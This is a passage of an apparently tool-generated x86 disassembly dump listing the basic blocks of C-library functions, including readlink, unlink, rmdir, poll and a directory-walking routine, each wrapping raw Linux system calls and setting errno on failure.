0xb0dbfe4:	mov	edi, dword ptr [esp + 0x3c]
0xb0dbfe8:	mov	dword ptr [esp], edx
0xb0dbfeb:	mov	dword ptr [esp + 0x2c], edx
0xb0dbfef:	mov	dword ptr [esp + 0x28], eax
0xb0dbff3:	mov	dword ptr [esp + 4], edi
0xb0dbff7:	call	0xb07d0b0
None
|
|
|
v
0xb0dbbfe:	test	eax, eax
0xb0dbc00:	js	0xb0dbc28
None
|
|
|
v
0xb0dbc55:	mov	eax, dword ptr [esp + 0x1c]
0xb0dbc59:	mov	dword ptr [esp], eax
0xb0dbc5c:	call	0xb017470
None
|
|
|
v
0xb0dbfc2:	mov	edx, dword ptr [esp + 0x2c]
0xb0dbfc6:	mov	dword ptr [esp + 0x1c], edx
0xb0dbfca:	mov	dword ptr [esp + 0x58], eax
0xb0dbfce:	mov	eax, dword ptr [esp + 0x28]
0xb0dbfd2:	mov	dword ptr [esp + 0x48], eax
0xb0dbfd6:	mov	edx, dword ptr [esp + 0x58]
0xb0dbfda:	mov	dword ptr [esp + 8], edi
0xb0dbfde:	mov	eax, dword ptr [esp + 0x6c]
0xb0dbfe2:	sub	edx, edi
0xb0dbfe4:	mov	edi, dword ptr [esp + 0x3c]
0xb0dbfe8:	mov	dword ptr [esp], edx
0xb0dbfeb:	mov	dword ptr [esp + 0x2c], edx
0xb0dbfef:	mov	dword ptr [esp + 0x28], eax
0xb0dbff3:	mov	dword ptr [esp + 4], edi
0xb0dbff7:	call	0xb07d0b0
None
|
|
|
v
0xb0dc1d9:	mov	eax, dword ptr [esp + 0x1c]
0xb0dc1dd:	mov	edi, dword ptr [esp + 0x48]
0xb0dc1e1:	lea	eax, dword ptr [eax + edi - 1]
0xb0dc1e5:	cmp	dword ptr [esp + 0x58], eax
0xb0dc1e9:	je	0xb0dc273
None
|
|
|
v
0xb0dc1ef:	mov	eax, dword ptr [esp + 0x58]
0xb0dc1f3:	sub	esi, eax
0xb0dc1f5:	mov	dword ptr [esp + 4], eax
0xb0dc1f9:	mov	eax, dword ptr [esp + 0x1c]
0xb0dc1fd:	mov	dword ptr [esp + 8], esi
0xb0dc201:	mov	dword ptr [esp], eax
0xb0dc204:	call	0xb07c960
None
|
|
|
v
0xb0dc1c1:	mov	edx, dword ptr [esp + 0x40]
0xb0dc1c5:	mov	eax, dword ptr [esp + 0x2c]
0xb0dc1c9:	xor	edx, dword ptr [esp + 0x60]
0xb0dc1cd:	xor	eax, dword ptr [esp + 0x64]
0xb0dc1d1:	or	edx, eax
0xb0dc1d3:	jne	0xb0dbd87
None
|
|
|
v
0xb0dbb94:	mov	ecx, 0x1000
0xb0dbb99:	cmp	eax, 0x1000
0xb0dbb9e:	cmovge	ecx, eax
0xb0dbba1:	mov	dword ptr [esp], ecx
0xb0dbba4:	mov	dword ptr [esp + 0x20], ecx
0xb0dbba8:	call	0xb0173f0
None
|
|
|
v
0xb0dbf41:	mov	eax, dword ptr [esp + 0x58]
0xb0dbf45:	not	ecx
0xb0dbf47:	lea	edi, dword ptr [ecx - 1]
0xb0dbf4a:	mov	ecx, dword ptr [esp + 0x1c]
0xb0dbf4e:	sub	eax, ecx
0xb0dbf50:	cmp	edi, eax
0xb0dbf52:	mov	dword ptr [esp + 0x2c], eax
0xb0dbf56:	jb	0xb0dbfd6
None
|
|
|
v
0xb0dbf06:	mov	edx, dword ptr [esp + 0x2c]
0xb0dbf0a:	mov	eax, dword ptr [esp + 0x40]
0xb0dbf0e:	xor	edx, dword ptr [esp + 0x74]
0xb0dbf12:	xor	eax, dword ptr [esp + 0x70]
0xb0dbf16:	or	edx, eax
0xb0dbf18:	jne	0xb0dbe48
None
|
|
|
v
0xb0dbf3f:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0xb0dc0b8:	mov	eax, dword ptr [esp + 0x20]
0xb0dc0bc:	mov	edi, 2
0xb0dc0c1:	mov	dword ptr [eax + ebp], 2
0xb0dc0c8:	xor	edx, edx
0xb0dc0ca:	mov	dword ptr [esp], esi
0xb0dc0cd:	mov	dword ptr [esp + 0x28], edx
0xb0dc0d1:	call	0xb0b1340
None
|
|
|
v
0xb0dbdeb:	test	esi, esi
0xb0dbded:	je	0xb0dbdff
None
|
|
|
v
0xb0dbe73:	mov	ecx, edi
0xb0dbe75:	test	cl, cl
0xb0dbe77:	je	0xb0dbeb8
None
|
|
|
v
0xb0dc19f:	jmp	0xb0dc0fe
None
|
|
|
v
0xb0dbbc0:	xor	eax, eax
0xb0dbbc2:	add	esp, 0xdc
0xb0dbbc8:	pop	ebx
0xb0dbbc9:	pop	esi
0xb0dbbca:	pop	edi
0xb0dbbcb:	pop	ebp
0xb0dbbcc:	ret	
None
|
|
|
v
0xb0dc11f:	mov	eax, dword ptr [esp + 0x44]
0xb0dc123:	mov	dword ptr [esp], eax
0xb0dc126:	call	0xb017470
None
|
|
|
v
0xb0dc25d:	mov	eax, dword ptr [esp + 0x1c]
0xb0dc261:	mov	dword ptr [esp + 4], esi
0xb0dc265:	mov	dword ptr [esp], eax
0xb0dc268:	call	0xb0173e0
None
|
|
|
v
0xb0dc110:	mov	eax, dword ptr [esp + 0xf4]
0xb0dc117:	test	eax, eax
0xb0dc119:	je	0xb0dbbc0
None
|
|
|
v
0xb0dbdef:	mov	dword ptr [esp], esi
0xb0dbdf2:	call	0xb0b1340
None
|
|
|
v
0xb0dc250:	mov	dword ptr [esp + 0x44], 0
0xb0dc258:	jmp	0xb0dc105
None
|
|
|
v
0xb0dc209:	cmp	byte ptr [esp + 0x57], 0
0xb0dc20e:	jne	0xb0dc25d
None
|
|
|
v
0xb0dbbad:	mov	ecx, dword ptr [esp + 0x20]
0xb0dbbb1:	test	eax, eax
0xb0dbbb3:	mov	dword ptr [esp + 0x1c], eax
0xb0dbbb7:	jne	0xb0dbbdf
None
|
|
|
v
0xb0dc03f:	mov	eax, edi
0xb0dc041:	test	al, al
0xb0dc043:	je	0xb0dc0b8
None
|
|
|
v
0xb0dc06d:	jmp	0xb0dbe48
None
|
|
|
v
0xb0dbce6:	mov	esi, dword ptr [esp + 0x1c]
0xb0dbcea:	add	esi, dword ptr [esp + 0x48]
0xb0dbcee:	lea	eax, dword ptr [esi - 1]
0xb0dbcf1:	mov	dword ptr [esp + 0x58], eax
0xb0dbcf5:	lea	eax, dword ptr [esp + 0x70]
0xb0dbcf9:	mov	byte ptr [esi - 1], 0
0xb0dbcfd:	mov	edi, eax
0xb0dbcff:	mov	dword ptr [esp + 0x38], eax
0xb0dbd03:	mov	dword ptr [esp + 8], eax
0xb0dbd07:	lea	eax, dword ptr [ebx - 0x48a1c]
0xb0dbd0d:	mov	dword ptr [esp + 4], eax
0xb0dbd11:	mov	dword ptr [esp], 3
0xb0dbd18:	call	0xb0da340
None
|
|
|
v
0xb0dc030:	mov	eax, dword ptr [esp + 0x20]
0xb0dc034:	mov	eax, dword ptr [eax + ebp]
0xb0dc037:	test	eax, eax
0xb0dc039:	jne	0xb0dc18c
None
|
|
|
v
0xb0dbc61:	xor	eax, eax
0xb0dbc63:	jmp	0xb0dbbc2
None
|
|
|
v
0xb0dc0de:	mov	ecx, dword ptr [esp + 0x24]
0xb0dc0e2:	xchg	ebx, ecx
0xb0dc0e4:	mov	eax, 6
0xb0dc0e9:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0dc161:	mov	dword ptr [esp + 0x48], 0x1001
0xb0dc169:	mov	dword ptr [esp + 0x44], 0
0xb0dc171:	jmp	0xb0dbce6
None
|
|
|
v
0xb0dbdff:	mov	eax, dword ptr [esp + 0x70]
0xb0dbe03:	mov	dword ptr [esp + 0x50], eax
0xb0dbe07:	mov	eax, dword ptr [esp + 0x74]
0xb0dbe0b:	mov	dword ptr [esp + 0x30], eax
0xb0dbe0f:	mov	eax, dword ptr [esp + 0xc8]
0xb0dbe16:	mov	dword ptr [esp + 0x6c], eax
0xb0dbe1a:	mov	eax, dword ptr [esp + 0x24]
0xb0dbe1e:	mov	dword ptr [esp], eax
0xb0dbe21:	call	0xb0b1f40
None
|
|
|
v
0xb0dbffc:	mov	edx, dword ptr [esp + 0x2c]
0xb0dc000:	mov	eax, dword ptr [esp + 0x6c]
0xb0dc004:	cmp	dword ptr [esp + 0x68], eax
0xb0dc008:	lea	edi, dword ptr [edx - 1]
0xb0dc00b:	mov	dword ptr [esp + 0x58], edi
0xb0dc00f:	mov	byte ptr [edx - 1], 0x2f
0xb0dc013:	je	0xb0dc287
None
|
|
|
v
0xb0dbc98:	mov	dword ptr [esp + 4], eax
0xb0dbc9c:	mov	eax, dword ptr [esp + 0x1c]
0xb0dbca0:	mov	dword ptr [esp], eax
0xb0dbca3:	call	0xb0173e0
None
|
|
|
v
0xb0dbdf7:	test	eax, eax
0xb0dbdf9:	jne	0xb0dc1a4
None
|
|
|
v
0xb0dbbb9:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0dbb87:	test	esi, esi
0xb0dbb89:	jne	0xb0dbc68
None
|
|
|
v
0xb0dc2bb:	mov	eax, dword ptr [esp + 0x20]
0xb0dc2bf:	mov	edi, dword ptr [eax + ebp]
0xb0dc2c2:	jmp	0xb0dc0c8
None
|
|
|
v
0xb0dbeb8:	add	eax, 0xb
0xb0dbebb:	mov	ecx, dword ptr [esp + 0x38]
0xb0dbebf:	mov	dword ptr [esp + 0x3c], eax
0xb0dbec3:	mov	dword ptr [esp + 8], eax
0xb0dbec7:	mov	eax, dword ptr [esp + 0x24]
0xb0dbecb:	mov	dword ptr [esp + 0x10], 0x100
0xb0dbed3:	mov	dword ptr [esp + 0xc], ecx
0xb0dbed7:	mov	dword ptr [esp], 3
0xb0dbede:	mov	dword ptr [esp + 4], eax
0xb0dbee2:	call	0xb0da520
None
|
|
|
v
0xb0dbea3:	mov	eax, dword ptr [esp + 0x20]
0xb0dbea7:	mov	dword ptr [eax + ebp], 0x16
0xb0dbeae:	xor	eax, eax
0xb0dbeb0:	jmp	0xb0dbbc2
None
|
|
|
v
0xb0dc0da:	test	dl, dl
0xb0dc0dc:	je	0xb0dc0f2
None
|
|
|
v
0xb0dc2dc:	xor	edx, edx
0xb0dc2de:	jmp	0xb0dc180
None
|
|
|
v
0xb0dbf63:	mov	eax, dword ptr [esp + 0x48]
0xb0dbf67:	mov	dword ptr [esp], ecx
0xb0dbf6a:	cmp	edi, eax
0xb0dbf6c:	cmovae	eax, edi
0xb0dbf6f:	add	eax, eax
0xb0dbf71:	mov	dword ptr [esp + 4], eax
0xb0dbf75:	mov	dword ptr [esp + 0x28], eax
0xb0dbf79:	call	0xb0173e0
None
|
|
|
v
0xb0dbbdb:	mov	dword ptr [esp + 0x1c], esi
0xb0dbbdf:	mov	edx, dword ptr [esp + 0x1c]
0xb0dbbe3:	xchg	ebx, edx
0xb0dbbe5:	mov	eax, 0xb7
0xb0dbbea:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0dc2ab:	mov	eax, dword ptr [esp + 0x1c]
0xb0dc2af:	mov	edi, dword ptr [esp + 0x48]
0xb0dc2b3:	lea	esi, dword ptr [eax + edi]
0xb0dc2b6:	jmp	0xb0dc1d9
None
|
|
|
v
0xb0dc1a4:	mov	edx, 1
0xb0dc1a9:	jmp	0xb0dc180
None
|
|
|
v
0xb0dc08e:	lea	eax, dword ptr [ebx - 0x48a1a]
0xb0dc094:	mov	dword ptr [esp + 0xc], eax
0xb0dc098:	lea	eax, dword ptr [ebx - 0x42b40]
0xb0dc09e:	mov	dword ptr [esp + 4], eax
0xb0dc0a2:	lea	eax, dword ptr [ebx - 0x42b1c]
0xb0dc0a8:	mov	dword ptr [esp + 8], 0x7b
0xb0dc0b0:	mov	dword ptr [esp], eax
0xb0dc0b3:	call	0xb027820
None
|
|
|
v
0xb0dc045:	mov	dword ptr [esp], esi
0xb0dc048:	xor	edi, edi
0xb0dc04a:	call	0xb0b15e0
None
|
|
|
v
0xb0dbd1d:	test	eax, eax
0xb0dbd1f:	js	0xb0dc176
None
|
|
|
v
0xb0dbbc2:	add	esp, 0xdc
0xb0dbbc8:	pop	ebx
0xb0dbbc9:	pop	esi
0xb0dbbca:	pop	edi
0xb0dbbcb:	pop	ebp
0xb0dbbcc:	ret	
None
|
|
|
v
0xb0dbe69:	cmp	byte ptr [eax + 0xb], 0x2e
0xb0dbe6d:	je	0xb0dc058
None
|
|
|
v
0xb0dbd9b:	mov	eax, dword ptr [esp + 0x4c]
0xb0dbd9f:	mov	dword ptr [esp + 0xc], 0
0xb0dbda7:	mov	dword ptr [esp + 8], 0x80000
0xb0dbdaf:	mov	dword ptr [esp + 4], eax
0xb0dbdb3:	mov	eax, dword ptr [esp + 0x24]
0xb0dbdb7:	mov	dword ptr [esp], eax
0xb0dbdba:	call	0xb0dadf0
None
|
|
|
v
0xb0dc273:	mov	eax, dword ptr [esp + 0x58]
0xb0dc277:	mov	byte ptr [eax - 1], 0x2f
0xb0dc27b:	sub	eax, 1
0xb0dc27e:	mov	dword ptr [esp + 0x58], eax
0xb0dc282:	jmp	0xb0dc1ef
None
|
|
|
v
0xb0dc132:	mov	eax, dword ptr [esp + 0x1c]
0xb0dc136:	mov	dword ptr [esp], eax
0xb0dc139:	call	0xb017470
None
|
|
|
v
0xb0dc1ad:	mov	eax, dword ptr [esp + 0x20]
0xb0dc1b1:	test	esi, esi
0xb0dc1b3:	mov	edi, dword ptr [eax + ebp]
0xb0dc1b6:	je	0xb0dc0da
None
|
|
|
v
0xb0dc18c:	mov	edi, eax
0xb0dc18e:	jmp	0xb0dc0c8
None
|
|
|
v
0xb0dbe26:	test	eax, eax
0xb0dbe28:	mov	esi, eax
0xb0dbe2a:	je	0xb0dc1a4
None
|
|
|
v
0xb0dbdbf:	test	eax, eax
0xb0dbdc1:	mov	dword ptr [esp + 0x24], eax
0xb0dbdc5:	js	0xb0dc1ab
None
|
|
|
v
0xb0dbe48:	mov	eax, dword ptr [esp + 0x20]
0xb0dbe4c:	mov	dword ptr [eax + ebp], 0
0xb0dbe53:	mov	dword ptr [esp], esi
0xb0dbe56:	call	0xb0b1390
None
|
|
|
v
0xb0dbee7:	test	eax, eax
0xb0dbee9:	js	0xb0dbe48
None
|
|
|
v
0xb0dc0c8:	xor	edx, edx
0xb0dc0ca:	mov	dword ptr [esp], esi
0xb0dc0cd:	mov	dword ptr [esp + 0x28], edx
0xb0dc0d1:	call	0xb0b1340
None
|
|
|
v
0xb0dbbdf:	mov	edx, dword ptr [esp + 0x1c]
0xb0dbbe3:	xchg	ebx, edx
0xb0dbbe5:	mov	eax, 0xb7
0xb0dbbea:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0dbc68:	mov	eax, dword ptr [ebx - 0xdc]
0xb0dbc6e:	mov	edx, dword ptr gs:[0]
0xb0dbc75:	mov	dword ptr [edx + eax], 0x16
0xb0dbc7c:	add	esp, 0xdc
0xb0dbc82:	xor	eax, eax
0xb0dbc84:	pop	ebx
0xb0dbc85:	pop	esi
0xb0dbc86:	pop	edi
0xb0dbc87:	pop	ebp
0xb0dbc88:	ret	
None
|
|
|
v
0xb0dc0ca:	mov	dword ptr [esp], esi
0xb0dc0cd:	mov	dword ptr [esp + 0x28], edx
0xb0dc0d1:	call	0xb0b1340
None
|
|
|
v
0xb0dc210:	mov	eax, dword ptr [esp + 0x44]
0xb0dc214:	mov	edi, dword ptr [esp + 0x20]
0xb0dc218:	mov	ecx, dword ptr [esp + 0x5c]
0xb0dc21c:	test	eax, eax
0xb0dc21e:	cmove	eax, dword ptr [esp + 0x1c]
0xb0dc223:	mov	dword ptr [edi + ebp], ecx
0xb0dc226:	jmp	0xb0dbc1a
None
|
|
|
v
0xb0dc193:	mov	eax, dword ptr [esp + 0x1c]
0xb0dc197:	mov	dword ptr [esp], eax
0xb0dc19a:	call	0xb017470
None
|
|
|
v
0xb0dbf36:	mov	edi, dword ptr [esp + 0x3c]
0xb0dbf3a:	xor	eax, eax
0xb0dbf3c:	or	ecx, 0xffffffff
0xb0dbf3f:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0xb0dc155:	test	eax, eax
0xb0dc157:	mov	dword ptr [esp + 0x1c], eax
0xb0dc15b:	je	0xb0dc250
None
|
|
|
v
0xb0dbf88:	mov	eax, dword ptr [esp + 0x1c]
0xb0dbf8c:	mov	ecx, dword ptr [esp + 0x58]
0xb0dbf90:	add	eax, dword ptr [esp + 0x48]
0xb0dbf94:	sub	ecx, eax
0xb0dbf96:	add	ecx, dword ptr [esp + 0x28]
0xb0dbf9a:	sub	eax, dword ptr [esp + 0x58]
0xb0dbf9e:	add	ecx, edx
0xb0dbfa0:	mov	dword ptr [esp + 0x1c], ecx
0xb0dbfa4:	mov	ecx, dword ptr [esp + 0x2c]
0xb0dbfa8:	mov	dword ptr [esp + 8], eax
0xb0dbfac:	mov	dword ptr [esp + 0x2c], edx
0xb0dbfb0:	add	ecx, edx
0xb0dbfb2:	mov	dword ptr [esp + 4], ecx
0xb0dbfb6:	mov	ecx, dword ptr [esp + 0x1c]
0xb0dbfba:	mov	dword ptr [esp], ecx
0xb0dbfbd:	call	0xb07d0b0
None
|
|
|
v
0xb0dc12b:	xor	eax, eax
0xb0dc12d:	jmp	0xb0dbc1a
None
|
|
|
v
0xb0dc1ab:	xor	edx, edx
0xb0dc1ad:	mov	eax, dword ptr [esp + 0x20]
0xb0dc1b1:	test	esi, esi
0xb0dc1b3:	mov	edi, dword ptr [eax + ebp]
0xb0dc1b6:	je	0xb0dc0da
None
|
|
|
v
0xb0dbeef:	mov	eax, dword ptr [esp + 0x80]
0xb0dbef6:	and	eax, 0xf000
0xb0dbefb:	cmp	eax, 0x4000
0xb0dbf00:	jne	0xb0dbe48
None
|
|
|
v
0xb0dbd87:	lea	eax, dword ptr [ebx - 0x48a1d]
0xb0dbd8d:	xor	esi, esi
0xb0dbd8f:	mov	dword ptr [esp + 0x24], 0xffffff9c
0xb0dbd97:	mov	dword ptr [esp + 0x4c], eax
0xb0dbd9b:	mov	eax, dword ptr [esp + 0x4c]
0xb0dbd9f:	mov	dword ptr [esp + 0xc], 0
0xb0dbda7:	mov	dword ptr [esp + 8], 0x80000
0xb0dbdaf:	mov	dword ptr [esp + 4], eax
0xb0dbdb3:	mov	eax, dword ptr [esp + 0x24]
0xb0dbdb7:	mov	dword ptr [esp], eax
0xb0dbdba:	call	0xb0dadf0
None
|
|
|
v
0xb0dc2a7:	test	eax, eax
0xb0dc2a9:	jne	0xb0dc2dc
None
|
|
|
v
0xb0dbf58:	cmp	byte ptr [esp + 0x57], 0
0xb0dbf5d:	je	0xb0dc2c7
None
|
|
|
v
0xb0dbb60:	push	ebp
0xb0dbb61:	push	edi
0xb0dbb62:	push	esi
0xb0dbb63:	push	ebx
0xb0dbb64:	sub	esp, 0xdc
0xb0dbb6a:	mov	ebp, dword ptr [esp + 0xf4]
0xb0dbb71:	call	0xb1267db
None
|
|
|
v
0xb0dc29f:	mov	dword ptr [esp], esi
0xb0dc2a2:	call	0xb0b1340
None
|
|
|
v
0xb0dbb76:	add	ebx, 0xcf48a
0xb0dbb7c:	mov	esi, dword ptr [esp + 0xf0]
0xb0dbb83:	test	ebp, ebp
0xb0dbb85:	jne	0xb0dbbd0
None
|
|
|
v
0xb0dc105:	cmp	byte ptr [esp + 0x56], 0
0xb0dc10a:	je	0xb0dbbc0
None
|
|
|
v
0xb0dc0d6:	mov	edx, dword ptr [esp + 0x28]
0xb0dc0da:	test	dl, dl
0xb0dc0dc:	je	0xb0dc0f2
None
|
|
|
v
0xb0dbc28:	mov	eax, dword ptr gs:[0]
0xb0dbc2e:	mov	ebp, dword ptr [ebx - 0xdc]
0xb0dbc34:	mov	dword ptr [esp + 0x20], eax
0xb0dbc38:	mov	eax, dword ptr [esp + 0x20]
0xb0dbc3c:	mov	eax, dword ptr [eax + ebp]
0xb0dbc3f:	cmp	eax, 0x24
0xb0dbc42:	je	0xb0dbcb0
None
|
|
|
v
0xb0dc1bc:	jmp	0xb0dc0ca
None
|
|
|
v
0xb0dc22b:	mov	edx, 1
0xb0dc230:	jmp	0xb0dc1ad
None
|
|
|
v
0xb0dc235:	mov	edi, dword ptr gs:[0]
0xb0dc23c:	neg	eax
0xb0dc23e:	mov	ebp, dword ptr [ebx - 0xdc]
0xb0dc244:	mov	dword ptr [esp + 0x20], edi
0xb0dc248:	mov	dword ptr [edi + ebp], eax
0xb0dc24b:	jmp	0xb0dbc38
None
|
|
|
v
0xb0dc062:	cmp	word ptr [eax + 0xc], 0x2e
0xb0dc067:	jne	0xb0dbe73
None
|
|
|
v
0xb0dc180:	mov	eax, dword ptr [esp + 0x20]
0xb0dc184:	mov	edi, dword ptr [eax + ebp]
0xb0dc187:	jmp	0xb0dc0da
None
|
|
|
v
0xb0dbde3:	test	eax, eax
0xb0dbde5:	js	0xb0dc22b
None
|
|
|
v
0xb0dbc4d:	test	esi, esi
0xb0dbc4f:	jne	0xb0dbbc0
None
|
|
|
v
0xb0dbe98:	cmp	byte ptr [esp + 0x56], 0
0xb0dbe9d:	jne	0xb0dc132
None
|
|
|
v
0xb0dc04f:	jmp	0xb0dbe48
None
|
|
|
v
0xb0dc078:	test	esi, esi
0xb0dc07a:	jne	0xb0dbc4d
None
|
|
|
v
0xb0dbc44:	cmp	eax, 0x22
0xb0dbc47:	je	0xb0dc078
None
|
|
|
v
0xb0dbc90:	test	esi, esi
0xb0dbc92:	jne	0xb0dbc11
None
|
|
|
v
0xb0dbd5a:	test	eax, eax
0xb0dbd5c:	js	0xb0dc176
None
|
|
|
v
0xb0dbca8:	mov	esi, eax
0xb0dbcaa:	jmp	0xb0dbc11
None
|
|
|
v
0xb0dbc02:	mov	edi, dword ptr [esp + 0xf4]
0xb0dbc09:	test	edi, edi
0xb0dbc0b:	je	0xb0dbc90
None
|
|
|
v
0xb0dc0f0:	xchg	ebx, ecx
0xb0dc0f2:	mov	edx, dword ptr [esp + 0x44]
0xb0dc0f6:	test	edx, edx
0xb0dc0f8:	je	0xb0dc193
None
|
|
|
v
0xb0dc0fe:	mov	eax, dword ptr [esp + 0x20]
0xb0dc102:	mov	dword ptr [eax + ebp], edi
0xb0dc105:	cmp	byte ptr [esp + 0x56], 0
0xb0dc10a:	je	0xb0dbbc0
None
|
|
|
v
0xb0dbe87:	mov	ecx, dword ptr [esp + 0x28]
0xb0dbe8b:	cmp	dword ptr [eax], ecx
0xb0dbe8d:	je	0xb0dbeb8
None
|
|
|
v
0xb0dc058:	cmp	byte ptr [eax + 0xc], 0
0xb0dc05c:	je	0xb0dbe48
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:readlink
TOTAL BLOCKS :5
0xb0dce60:	push	ebx
0xb0dce61:	mov	edx, dword ptr [esp + 0x10]
0xb0dce65:	mov	ecx, dword ptr [esp + 0xc]
0xb0dce69:	mov	ebx, dword ptr [esp + 8]
0xb0dce6d:	mov	eax, 0x55
0xb0dce72:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0dce87:	add	ecx, 0xce179
0xb0dce8d:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0dce93:	neg	eax
0xb0dce95:	add	ecx, dword ptr gs:[0]
0xb0dce9c:	mov	dword ptr [ecx], eax
0xb0dce9e:	or	eax, 0xffffffff
0xb0dcea1:	ret	
None
|
|
|
v
0xb0dce79:	pop	ebx
0xb0dce7a:	cmp	eax, 0xfffff001
0xb0dce7f:	jae	0xb0dce82
None
|
|
|
v
0xb0dce81:	ret	
None
|
|
|
v
0xb0dce82:	call	0xb1267df
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:unlink
TOTAL BLOCKS :5
0xb0dcf1c:	call	0xb1267df
None
|
|
|
v
0xb0dcf21:	add	ecx, 0xce0df
0xb0dcf27:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0dcf2d:	neg	eax
0xb0dcf2f:	add	ecx, dword ptr gs:[0]
0xb0dcf36:	mov	dword ptr [ecx], eax
0xb0dcf38:	or	eax, 0xffffffff
0xb0dcf3b:	ret	
None
|
|
|
v
0xb0dcf1b:	ret	
None
|
|
|
v
0xb0dcf00:	mov	edx, ebx
0xb0dcf02:	mov	ebx, dword ptr [esp + 4]
0xb0dcf06:	mov	eax, 0xa
0xb0dcf0b:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0dcf12:	mov	ebx, edx
0xb0dcf14:	cmp	eax, 0xfffff001
0xb0dcf19:	jae	0xb0dcf1c
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:rmdir
TOTAL BLOCKS :5
0xb0dcfac:	call	0xb1267df
None
|
|
|
v
0xb0dcfb1:	add	ecx, 0xce04f
0xb0dcfb7:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0dcfbd:	neg	eax
0xb0dcfbf:	add	ecx, dword ptr gs:[0]
0xb0dcfc6:	mov	dword ptr [ecx], eax
0xb0dcfc8:	or	eax, 0xffffffff
0xb0dcfcb:	ret	
None
|
|
|
v
0xb0dcfab:	ret	
None
|
|
|
v
0xb0dcf90:	mov	edx, ebx
0xb0dcf92:	mov	ebx, dword ptr [esp + 4]
0xb0dcf96:	mov	eax, 0x28
0xb0dcf9b:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0dcfa2:	mov	ebx, edx
0xb0dcfa4:	cmp	eax, 0xfffff001
0xb0dcfa9:	jae	0xb0dcfac
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:poll
TOTAL BLOCKS :13
0xb0dcffc:	call	0xb0f9490
None
|
|
|
v
0xb0dcff3:	pop	ebx
0xb0dcff4:	cmp	eax, 0xfffff001
0xb0dcff9:	jae	0xb0dd02d
None
|
|
|
v
0xb0dcffb:	ret	
None
|
|
|
v
0xb0dd02c:	ret	
None
|
|
|
v
0xb0dcfd0:	cmp	dword ptr gs:[0xc], 0
0xb0dcfd8:	jne	0xb0dcffc
None
|
|
|
v
0xb0dd024:	pop	eax
0xb0dd025:	cmp	eax, 0xfffff001
0xb0dd02a:	jae	0xb0dd02d
None
|
|
|
v
0xb0dd001:	push	eax
0xb0dd002:	push	ebx
0xb0dd003:	mov	edx, dword ptr [esp + 0x14]
0xb0dd007:	mov	ecx, dword ptr [esp + 0x10]
0xb0dd00b:	mov	ebx, dword ptr [esp + 0xc]
0xb0dd00f:	mov	eax, 0xa8
0xb0dd014:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0dd01f:	call	0xb0f94f0
None
|
|
|
v
0xb0dd032:	add	ecx, 0xcdfce
0xb0dd038:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0dd03e:	neg	eax
0xb0dd040:	add	ecx, dword ptr gs:[0]
0xb0dd047:	mov	dword ptr [ecx], eax
0xb0dd049:	or	eax, 0xffffffff
0xb0dd04c:	ret	
None
|
|
|
v
0xb0dd02d:	call	0xb1267df
None
|
|
|
v
0xb0dd01c:	xchg	dword ptr [esp], eax
None
|
|
|
v
0xb0dd01b:	pop	ebx
0xb0dd01c:	xchg	dword ptr [esp], eax
None
|
|
|
v
0xb0dcfda:	push	ebx
0xb0dcfdb:	mov	edx, dword ptr [esp + 0x10]
0xb0dcfdf:	mov	ecx, dword ptr [esp + 0xc]
0xb0dcfe3:	mov	ebx, dword ptr [esp + 8]
0xb0dcfe7:	mov	eax, 0xa8
0xb0dcfec:	call	dword ptr gs:[0x10]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0e14f0
TOTAL BLOCKS :9
0xb0e15b8:	mov	eax, dword ptr [ebx - 0xdc]
0xb0e15be:	mov	edx, dword ptr gs:[0]
0xb0e15c5:	mov	dword ptr [edx + eax], 0x4b
0xb0e15cc:	mov	eax, 0xffffffff
0xb0e15d1:	pop	ebx
0xb0e15d2:	pop	esi
0xb0e15d3:	pop	edi
0xb0e15d4:	ret	
None
|
|
|
v
0xb0e1532:	mov	eax, dword ptr [esi + 0x10]
0xb0e1535:	mov	edx, dword ptr [esi + 0x24]
0xb0e1538:	mov	edi, dword ptr [esi + 0x30]
0xb0e153b:	mov	dword ptr [ecx + 0x10], eax
0xb0e153e:	mov	eax, dword ptr [esi + 0x14]
0xb0e1541:	mov	dword ptr [ecx + 0x14], eax
0xb0e1544:	mov	eax, dword ptr [esi + 0x18]
0xb0e1547:	mov	dword ptr [ecx + 0x18], eax
0xb0e154a:	mov	eax, dword ptr [esi + 0x1c]
0xb0e154d:	mov	dword ptr [ecx + 0x1c], eax
0xb0e1550:	mov	eax, dword ptr [esi + 0x20]
0xb0e1553:	mov	dword ptr [ecx + 0x24], edx
0xb0e1556:	mov	dword ptr [ecx + 0x20], eax
0xb0e1559:	xor	eax, eax
0xb0e155b:	mov	word ptr [ecx + 0x28], ax
0xb0e155f:	mov	eax, dword ptr [esi + 0x2c]
0xb0e1562:	cdq	
0xb0e1563:	cmp	edi, edx
0xb0e1565:	mov	dword ptr [ecx + 0x2c], eax
0xb0e1568:	jne	0xb0e15b8
None
|
|
|
v
0xb0e15d8:	mov	eax, dword ptr [ebx - 0xdc]
0xb0e15de:	mov	edx, dword ptr gs:[0]
0xb0e15e5:	mov	dword ptr [edx + eax], 0x16
0xb0e15ec:	mov	eax, 0xffffffff
0xb0e15f1:	jmp	0xb0e15b2
None
|
|
|
v
0xb0e1511:	mov	eax, dword ptr [esi]
0xb0e1513:	mov	edx, dword ptr [esi + 4]
0xb0e1516:	mov	dword ptr [ecx], eax
0xb0e1518:	mov	eax, dword ptr [esi + 0x5c]
0xb0e151b:	mov	dword ptr [ecx + 4], edx
0xb0e151e:	xor	edx, edx
0xb0e1520:	mov	word ptr [ecx + 8], dx
0xb0e1524:	mov	edx, dword ptr [esi + 0x58]
